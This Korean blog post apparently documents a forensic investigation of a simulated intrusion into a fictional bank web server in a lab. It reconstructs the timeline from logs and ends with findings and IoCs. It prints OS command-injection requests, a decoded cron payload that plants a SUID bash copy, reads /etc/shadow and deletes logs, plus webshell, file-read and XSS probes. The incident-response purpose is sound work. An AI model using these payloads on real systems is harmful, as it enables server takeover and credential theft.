---
title: '모두뱅크 웹 서버 침해사고 조사: 명령 주입에서 root cron 변조까지'
date: 2026-11-04 00:00:00 +0900
categories:
- CERT
tags:
- pentest
- web
author: mmamm4
---

# 모두뱅크 웹 서버 침해사고 조사: 명령 주입에서 root cron 변조까지

2026-11-04 15:28~15:32(KST) 모두뱅크 웹 서버에 발생한 침해사고를 서버에서 수집한 로그로 조사한 기록입니다. 공격자는 웹 애플리케이션의 OS 명령 주입으로 tomcat 권한을 얻은 뒤, root가 매분 실행하는 cron 스크립트를 덮어써 약 4분 만에 root 권한을 확보했습니다. 이 사고는 모의훈련 환경에서 재현한 것이며, 공격 출발지 `192.168.6.132`는 훈련용 Kali 호스트입니다.

> **Note:** 실습용 가상 대상
> 이 글의 "모두뱅크(modubank)"는 침투 테스트·침해사고 조사 실습을 위해 직접 구축한 가상 대상 애플리케이션입니다. 실재하는 금융기관이나 서비스와는 관련이 없습니다. 모든 작업은 격리된 로컬 랩 환경(사설 IP `192.168.6.0/24`)에서만 수행했습니다.

조사 근거는 사고 직후 서버에서 수집한 사본입니다. 원본 로그·설정 파일(nginx·Tomcat 접근 로그, `/var/log/secure`·`messages`·`cron`, `audit.log`, cron 설정, 공격자가 남긴 파일)과, 그중 일부를 추린 요약 파일로 나눠 보관했습니다. 요약 파일은 원본 로그와 대조해 일치하는 내용만 근거로 사용했습니다.

## 환경과 대상

- 대상 서버: `192.168.6.167`, Rocky/RHEL 9 계열(커널 5.14.0-162.6.1.el9_1), SELinux 사용
- 웹 구성: nginx :80 → Tomcat 11.0.14 :8080(리버스 프록시), Tomcat AJP :8009가 `0.0.0.0`으로 리슨
- 애플리케이션: Spring 기반 `modubank`(`kr.co.modubank.*`), 업로드 디렉터리 `/opt/tomcat/webapps/ROOT/uploads`
- DB: MariaDB 10.5.29, 접속 정보는 `/opt/modubank/config/application.yml`에 평문 저장
- 공격 출발지: `192.168.6.132`(훈련용 Kali)

2026-09-06~09-07의 로그는 관리자가 `192.168.121.1`에서 root로 SSH 접속해 서버를 구축한 기록입니다. `root/.bash_history`에 `vm-provision/01~07-*.sh` 실행 이력이 있고, 같은 기간 nginx 접근도 `192.168.121.1`의 정상 탐색뿐이어서 이번 사고와는 분리했습니다. 서버는 11-04 15:24:43에 부팅됐고, 공격은 그 4분 뒤 시작됐습니다.

## 분석

### 정찰

15:28:37~15:28:41에 서비스 스캔이 있었습니다. nginx 접근 로그에 Nmap Scripting Engine User-Agent가 26건 남았고, `/.git/HEAD`, `/HNAP1`, `/evox/about`, `/sdk`, `PROPFIND` 같은 NSE 기본 프로브가 보였습니다. `/var/log/secure`에는 SSH 프로토콜 탐지와 호스트키 협상 실패(`ssh-dss`, `ssh-rsa`, `ecdsa-sha2-nistp384/521`)만 있고 인증 성공은 없었습니다. 같은 시각 Tomcat 로그에 AJP :8009로 들어온 잘못된 메시지 오류(`AjpMessage.processHeader Invalid message`)가 기록돼, AJP 포트도 외부에서 닿는 상태였습니다.

15:28:51부터 Tomcat :8080에 nginx를 거치지 않은 직접 요청이 이어졌습니다. 11-04 Tomcat 접근 로그 4,777건 가운데 4,675건이 `192.168.6.132`에서 온 직접 요청이고, 15:29 한 분 동안 약 4,600건이 몰려 디렉터리 무차별 대입으로 판단했습니다. `/manager/html`, `/host-manager/html`은 401로 막혔습니다. 이어 15:29:34에 Spring Actuator 엔드포인트(`/actuator/env`, `/actuator/loggers`, `/actuator/threaddump`)가 모두 200으로 응답해 내부 설정과 스레드 정보가 노출됐습니다.

같은 15:28:38에 `192.168.6.167`(서버 자신의 IP)에서 8080으로 `OPTIONS /`, `GET /` 2건이 기록됐습니다. 스캔 응답 과정에서 생긴 자기 접속으로 보이며, 공격과의 관련은 확인하지 못했습니다.

### OS 명령 주입으로 초기 침투

15:29:41에 공격자는 회원가입(`POST /signup`)과 로그인을 거쳐 `/bank/connectivity`(연결 확인 기능)에 접근했습니다. 이 기능의 `host` 파라미터에 `|`를 붙인 명령이 그대로 실행됐습니다.

```
GET /bank/connectivity/check?host=127.0.0.1|id
GET /bank/connectivity/check?host=127.0.0.1|id; hostname; cat /etc/os-release | head -3; uname -r
GET /bank/connectivity/check?host=127.0.0.1|cat /opt/modubank/config/application.yml
```

실행 계정은 tomcat(uid 990)입니다. `audit.log`에 15:30:02 uid 990의 `sudo -l` 실패(`USER_CMD cmd="list" res=failed`)와 15:30:09 tomcat 계정의 `crontab` 실행이 남아, 웹 요청 시각과 일치합니다. 15:29:52~15:30:11 사이에 공격자는 OS·커널 버전, `/opt/modubank` 디렉터리 구조, `application.yml`(DB 계정 `modubank` / `modubank!2024`), `/etc/passwd`, `/etc/crontab`과 `/etc/cron.d/*`, SUID 파일 목록(`find / -perm -4000`)을 차례로 확인했습니다.

### root 권한 상승

권한 상승 경로로 두 가지를 시도했습니다. 15:30:21에 SUID 바이너리 `/opt/modubank/bin/bank_report`가 `date`를 PATH에서 찾는 점을 노려 `/tmp/ph/date`를 만들고 `PATH`를 바꿔 실행했으나, 응답이 137바이트에 그쳐 shadow 내용은 반환되지 않았습니다. 이 경로는 실패한 것으로 판단했습니다.

두 번째 경로는 cron이었습니다. `/etc/cron.d/modubank-log-cleanup`은 매분 root로 `/opt/modubank/scripts/log-cleanup.sh`를 실행하는데, tomcat이 이 스크립트에 쓸 수 있었습니다. 15:30:34에 공격자는 base64로 인코딩한 내용을 이 파일에 덮어썼고, 디코딩한 내용은 다음과 같습니다.

```bash
#!/usr/bin/env bash
cp /bin/bash /tmp/.rbsuid 2>/dev/null; chmod 4755 /tmp/.rbsuid 2>/dev/null
(id; echo "---SHADOW-HEAD---"; head -3 /etc/shadow) > /tmp/.roofproof 2>&1
chmod 644 /tmp/.roofproof 2>/dev/null
find /opt/tomcat/logs -type f -name "*.log" -mtime +7 -delete 2>/dev/null
exit 0
```

수집된 `/tmp/.roofproof`에는 `uid=0(root)`와 SELinux 컨텍스트 `system_u:system_r:system_cronjob_t`, root의 `$6$` 해시를 포함한 `/etc/shadow` 앞 3줄이 기록돼 있습니다. cron이 변조된 스크립트를 root로 실행했다는 증거입니다. 15:30:56의 첫 확인 요청은 193바이트, 15:31:01 cron 실행 이후인 15:31:52의 확인 요청은 413바이트로 응답 크기가 늘어, 그 사이에 파일이 생성된 것으로 보입니다.

이후 15:32:00~15:32:07에 공격자는 `/tmp/.rbsuid -p -c "..."`로 root 명령을 실행했습니다. 로그 파일 크기(`du -sh /var/log/*`, Tomcat·nginx·audit·mariadb 로그), 최근 로그인 기록(`last -n 15`), 반출 도구 존재 여부(`which nc ncat python3 tar base64`)를 확인했습니다.

### 그 밖의 웹 공격

권한 상승과 병행해 애플리케이션 취약점도 시도됐습니다.

- 파일 업로드 웹셸: 15:30:43 `POST /files/upload`로 `shell.jsp`를 올렸고, `/uploads/shell.jsp`가 JSP로 실행돼 `WSHELL_OK:<날짜>`를 반환했습니다. 수집된 파일 내용은 `<%= "WSHELL_OK:"+ (new java.util.Date()) %>`로, 실행 여부 확인용입니다.
- 임의 파일 읽기: `/files/download?name=/etc/passwd`(절대경로)가 200으로 1,509바이트를 반환했습니다. `../` 상대경로와 이중 인코딩 시도는 404였습니다.
- XSS 시도: `/board?q=<script>alert(document.cookie)</script>`가 200으로 응답했고 게시글 작성(`POST /board/write`)도 1건 있었습니다. 스크립트 반사·저장 여부는 접근 로그만으로 판단할 수 없습니다.
- 그 밖에 `/mypage/api-key`는 200, `/api/v1/accounts/1`·`/1001`은 401이었습니다.

## 결과

공격자가 서버에 남긴 흔적은 다음과 같습니다.

- `/tmp/.rbsuid`: SUID root 비트가 설정된 bash 복사본(4755)
- `/tmp/.roofproof`: root id 결과와 `/etc/shadow` 일부
- `/opt/modubank/scripts/log-cleanup.sh`: 변조된 스크립트. cron이 매분 root로 실행하므로 `.rbsuid`를 계속 재생성합니다.
- `/opt/tomcat/webapps/ROOT/uploads/shell.jsp`: 업로드된 JSP 웹셸
- `/tmp/ph/date`: 실패한 PATH 하이재킹 시도 파일

침해에 이용됐거나 공격 중 노출이 확인된 설정 문제는 다음과 같습니다.

- `/bank/connectivity/check`의 OS 명령 주입
- root cron이 실행하는 스크립트를 tomcat이 쓸 수 있는 권한 설정
- Spring Actuator(`env`, `threaddump` 등) 외부 노출
- Tomcat AJP :8009와 :8080의 외부 직접 접근 허용
- 업로드 디렉터리가 웹 루트 아래에 있어 JSP 실행 가능
- 파일 다운로드의 절대경로 처리 미흡
- DB 계정의 평문 저장

수집된 로그에는 공백 구간이 있습니다. `messages`는 15:29:14, `audit.log`는 15:30:09, `cron`은 15:29:01에서 끝나, 15:31 이후 cron 실행이나 프로세스 생성을 직접 보여주는 시스템 로그는 없습니다. 페이로드에 7일이 지난 Tomcat `*.log`를 지우는 명령이 들어 있고, 실제로 9월의 `catalina.*.log`는 남아 있지 않고 `.txt` 접근 로그만 남아 있습니다. 이 명령으로 삭제됐을 가능성이 있지만 삭제 전 상태가 없어 확정하지 못했습니다. 15:32:07 이후 데이터 반출 흔적은 수집 범위 안에서 확인되지 않았습니다.

## 정리

이번 사고는 웹 애플리케이션의 명령 주입 하나가 쓰기 가능한 root cron 스크립트와 겹치면서 서버 전체 장악으로 이어졌습니다. 명령 주입으로 얻은 것은 tomcat 권한이었지만, root 권한까지 간 결정적 원인은 cron 스크립트의 파일 권한이었습니다. SUID 바이너리를 이용한 PATH 하이재킹은 실패했으므로, 권한 상승 경로는 cron 하나로 확인됩니다. 조사 범위는 수집된 로그 사본(로컬)에 한정되며, 서버를 직접 점검하지는 않았습니다.

다음 단계로 이번 타임라인을 기준으로 명령 주입 파라미터 패턴과 `/etc/cron.d`가 참조하는 스크립트의 변경을 잡는 탐지 룰을 검토할 수 있습니다.

## IoC

- 공격 출발지: `192.168.6[.]132`(훈련용 사설 IP)
- 웹 요청 패턴: `/bank/connectivity/check?host=...|<command>`
- 파일: `/tmp/.rbsuid`, `/tmp/.roofproof`, `/tmp/ph/date`, `/opt/tomcat/webapps/ROOT/uploads/shell.jsp`
- 변조 파일: `/opt/modubank/scripts/log-cleanup.sh`
